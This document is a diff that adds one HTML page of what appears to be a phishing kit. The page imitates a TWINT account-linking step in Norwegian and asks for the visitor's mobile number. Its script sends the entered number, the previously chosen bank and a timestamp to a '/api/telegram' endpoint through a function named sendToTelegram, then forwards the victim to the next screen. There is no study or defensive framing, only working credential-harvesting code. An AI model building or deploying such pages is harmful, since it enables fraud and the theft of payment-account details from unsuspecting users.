@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="nb">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>TWINT — Telefonnummer</title>
+    <style>
+      :root {
+        font-family: "Inter", "Segoe UI", system-ui, sans-serif;
+        color: #0f172a;
+        background: #f3f4f6;
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+
+      body {
+        margin: 0;
+        min-height: 100vh;
+        background: #f3f4f6;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 0;
+      }
+
+      .shell {
+        width: min(420px, 100%);
+        background: white;
+        border-radius: 0;
+        padding: 1.5rem 1.75rem;
+        min-height: 100vh;
+        box-shadow: 0 15px 45px rgba(15, 23, 42, 0.18);
+      }
+
+      .step {
+        display: flex;
+        flex-direction: column;
+        gap: 0.45rem;
+        padding: 0 0.25rem 0.75rem;
+      }
+
+      .step-label {
+        font-size: 0.8rem;
+        letter-spacing: 0.08em;
+        text-transform: uppercase;
+        color: #94a3b8;
+      }
+
+      .step-progress {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+      }
+
+      .progress-bar {
+        flex: 1;
+        height: 0.35rem;
+        background: #e2e8f0;
+        border-radius: 999px;
+        margin-right: 0.75rem;
+        overflow: hidden;
+      }
+
+      .progress-bar span {
+        display: block;
+        width: 66%;
+        height: 100%;
+        background: #fbbf24;
+        border-radius: inherit;
+      }
+
+      .step-progress strong {
+        font-size: 0.75rem;
+        color: #475569;
+      }
+
+      .bank-chip {
+        margin-bottom: 1rem;
+        font-weight: 600;
+        color: #475569;
+        letter-spacing: 0.02em;
+      }
+
+      h1 {
+        margin: 0 0 0.5rem;
+        font-size: 1.75rem;
+      }
+
+      .copy {
+        margin: 0 0 1.5rem;
+        line-height: 1.6;
+        color: #475569;
+      }
+
+      form {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem;
+      }
+
+      label {
+        font-weight: 600;
+        color: #475569;
+      }
+
+      input[type="tel"] {
+        width: 100%;
+        padding: 0.95rem 1rem;
+        border: 1px solid #cbd5f5;
+        border-radius: 12px;
+        font-size: 1rem;
+        font-weight: 600;
+        color: #0f172a;
+        background: #f8fafc;
+      }
+
+      .buttons {
+        display: flex;
+        flex-direction: column;
+        gap: 0.75rem;
+        margin-top: 1rem;
+      }
+
+      .buttons button {
+        border: none;
+        border-radius: 14px;
+        padding: 0.95rem;
+        font-size: 1rem;
+        font-weight: 600;
+        cursor: pointer;
+      }
+
+      .primary {
+        background: #fbbf24;
+        color: #0f172a;
+        box-shadow: 0 10px 20px rgba(251, 191, 36, 0.45);
+      }
+
+      .secondary {
+        background: white;
+        border: 1px solid #d1d5db;
+        color: #475569;
+      }
+
+      .footnote {
+        margin-top: 1.5rem;
+        font-size: 0.9rem;
+        color: #94a3b8;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="shell">
+      <div class="step">
+        <div class="step-label">Step 2/3</div>
+        <div class="step-progress">
+          <div class="progress-bar"><span></span></div>
+          <strong>Step 2/3</strong>
+        </div>
+      </div>
+
+      <div class="bank-chip">
+        Valgt bank: <span id="selected-bank">—</span>
+      </div>
+
+      <h1>Hva er mobilnummeret ditt?</h1>
+      <p class="copy">
+        Vi bruker nummeret for å sende en engangskode som må registreres i TWINT-appen. Skriv inn nummeret som er koblet til den valgte banken.
+      </p>
+
+      <form>
+        <label for="phone">Mobilnummer</label>
+        <input type="tel" id="phone" name="phone" placeholder="+41 79 123 45 67" />
+
+        <div class="buttons">
+          <button type="button" class="primary" id="next-button">Neste</button>
+          <button type="button" class="secondary" id="back-button">Tilbake</button>
+        </div>
+      </form>
+
+      <p class="footnote">Nummeret må være registrert hos banken din for å kunne koble TWINT.</p>
+
+      <script>
+        const storedBank = localStorage.getItem("selectedBank");
+        const selectedBankEl = document.getElementById("selected-bank");
+        const nextButton = document.getElementById("next-button");
+        const backButton = document.getElementById("back-button");
+        const phoneInput = document.getElementById("phone");
+
+        if (storedBank) {
+          selectedBankEl.textContent = storedBank;
+        }
+
+        // Helper function to send data to Telegram
+        async function sendToTelegram(data) {
+          try {
+            await fetch('/api/telegram', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(data)
+            });
+          } catch (error) {
+            console.error('Error sending to Telegram:', error);
+          }
+        }
+
+        nextButton.addEventListener("click", async () => {
+          if (!phoneInput.value.trim()) {
+            alert("Legg inn mobilnummeret ditt for å gå videre.");
+            return;
+          }
+          
+          const phone = phoneInput.value.trim();
+          localStorage.setItem("phoneNumber", phone);
+          
+          // Send to Telegram
+          await sendToTelegram({
+            action: 'phone_entered',
+            bank: storedBank || null,
+            phone: phone,
+            timestamp: new Date().toISOString()
+          });
+          
+          window.location.href = "screen-4.html";
+        });
+
+        backButton.addEventListener("click", () => {
+          window.location.href = "index.html";
+        });
+      </script>
+    </div>
+  </body>
+</html>
+
